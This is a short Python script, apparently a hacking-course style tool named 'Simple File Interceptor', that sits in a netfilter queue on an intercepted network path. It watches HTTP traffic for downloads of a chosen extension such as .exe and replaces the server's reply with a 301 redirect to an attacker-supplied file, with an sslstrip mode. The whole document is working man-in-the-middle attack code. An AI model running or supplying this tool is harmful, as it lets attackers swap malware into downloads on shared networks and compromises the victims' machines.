#!/usr/bin/env python3
import scapy.all as scapy
from snfq import SNFQ

ack_list = []


def process_packet(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    if scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.haslayer(scapy.TCP):
        if scapy_pkt[scapy.TCP].dport == 80 or scapy_pkt[scapy.TCP].dport == 10000:
            if extension in str(scapy_pkt[scapy.Raw].load) and replace_link not in str(scapy_pkt[scapy.Raw].load):
                print("[+] {} request".format(extension))
                ack_list.append(scapy_pkt[scapy.TCP].ack)
        elif scapy_pkt[scapy.TCP].sport == 80 or scapy_pkt[scapy.TCP].sport == 10000:
            if scapy_pkt[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_pkt[scapy.TCP].seq)
                print("[+] Replacing file")
                scapy_pkt[scapy.Raw].load = \
                    "HTTP/1.1 301 Moved Permanently" \
                    "\nLocation: {}\n\n".format(replace_link)
                del scapy_pkt[scapy.IP].len
                del scapy_pkt[scapy.IP].chksum
                del scapy_pkt[scapy.TCP].chksum
                pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()


print("Simple File Interceptor 0.01 by Ravehorn")
destination = input("Destination (sslstrip, forward, local) -> ")
extension = input("What extension do you want to target? (.exe, etc) -> ")
replace_link = input("What file do you want to toss in? (link) -> ")
queue = SNFQ(process_packet, destination=destination)
